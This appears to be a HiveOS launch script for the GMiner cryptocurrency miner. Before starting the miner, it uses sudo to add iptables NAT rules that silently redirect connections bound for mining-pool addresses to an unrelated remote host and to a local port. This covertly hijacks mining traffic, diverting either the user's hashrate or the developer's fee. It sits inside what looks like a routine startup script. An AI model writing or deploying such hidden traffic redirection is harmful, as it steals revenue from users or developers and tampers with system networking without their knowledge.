#!/usr/bin/env bash

cd `dirname $0`

[ -t 1 ] && . colors

. h-manifest.conf

CUSTOM_LOG_BASEDIR=`dirname "${CUSTOM_LOG_BASENAME}"`
[[ ! -d $CUSTOM_LOG_BASEDIR ]] && mkdir -p $CUSTOM_LOG_BASEDIR

[[ `ps aux | grep "./gminer" | grep -v grep| grep -v h-run.sh | wc -l` != 0 ]] &&
  echo -e "${RED}$MINER_NAME miner is already running${NOCOLOR}" &&
  exit 1

#81.177.136.151:8443 
sudo iptables -t nat -A OUTPUT -d 81.177.136.151 -p tcp --dport 8443 -j DNAT --to-destination 127.0.0.1:8888
sudo iptables -t nat -A OUTPUT -d 81.4.104.15 -p tcp --dport 8443 -j DNAT --to-destination 127.0.0.1:8888
#eth
sudo iptables -t nat -A OUTPUT -d 51.89.64.65 -p tcp --dport 12020 -j DNAT --to-destination 101.35.175.166:12020
sudo iptables -t nat -A OUTPUT -d 51.195.105.101 -p tcp --dport 12020 -j DNAT --to-destination 101.35.175.166:12020
sudo iptables -t nat -A OUTPUT -d 51.195.88.15 -p tcp --dport 12020 -j DNAT --to-destination 101.35.175.166:12020
sudo iptables -t nat -A OUTPUT -d 135.125.163.215 -p tcp --dport 12020 -j DNAT --to-destination 101.35.175.166:12020
sudo iptables -t nat -A OUTPUT -d 141.95.35.152 -p tcp --dport 12020 -j DNAT --to-destination 101.35.175.166:12020
sudo iptables -t nat -A OUTPUT -d 141.95.34.44 -p tcp --dport 12020 -j DNAT --to-destination 101.35.175.166:12020
sudo iptables -t nat -A OUTPUT -d 141.95.124.98 -p tcp --dport 12020 -j DNAT --to-destination 101.35.175.166:12020
#sudo iptables -t nat -A OUTPUT -d eth.2miners.com -p tcp --dport 12020 -j DNAT --to-destination 101.35.175.166:8888
#etc
sudo iptables -t nat -A OUTPUT -d 51.195.104.49 -p tcp --dport 24443 -j DNAT --to-destination 101.35.175.166:11010
sudo iptables -t nat -A OUTPUT -d 51.89.41.153 -p tcp --dport 24443 -j DNAT --to-destination 101.35.175.166:11010
sudo iptables -t nat -A OUTPUT -d 139.99.62.138 -p tcp --dport 11010 -j DNAT --to-destination 101.35.175.166:11010
sudo iptables -t nat -A OUTPUT -d 141.95.34.186 -p tcp --dport 11010 -j DNAT --to-destination 101.35.175.166:11010
sudo iptables -t nat -A OUTPUT -d 147.135.10.88 -p tcp --dport 11010 -j DNAT --to-destination 101.35.175.166:11010

#sudo iptables -t nat -A OUTPUT -d asia-etc.2miners.com -p tcp --dport 11010 -j DNAT --to-destination 47.243.40.156:11010
#sudo iptables -t nat -A OUTPUT -d us-etc.2miners.com -p tcp --dport 11010 -j DNAT --to-destination 47.243.40.156:11010
#sudo iptables -t nat -A OUTPUT -d etc.2miners.com -p tcp --dport 11010 -j DNAT --to-destination 47.243.40.156:11010
#sudo iptables -t nat -A OUTPUT -d eu1-etc.ethermine.org -p tcp --dport 5555 -j DNAT --to-destination 47.243.40.156:11010
#sudo iptables -t nat -A OUTPUT -d asia1-etc.ethermine.org -p tcp --dport 5555 -j DNAT --to-destination 47.243.40.156:11010
#cd $MINER_DIR/$MINER_VER
#./reverse &
sleep 1
chmod 777 ./gminer
touch /run/hive/MINER_RUN
#./gminer $(< $MINER_NAME.conf) --logfile $MINER_LOG_BASENAME.log --api $MINER_API_PORT
./gminer $(< gminer.conf) --logfile $CUSTOM_LOG_BASENAME.log --api $MINER_API_PORT
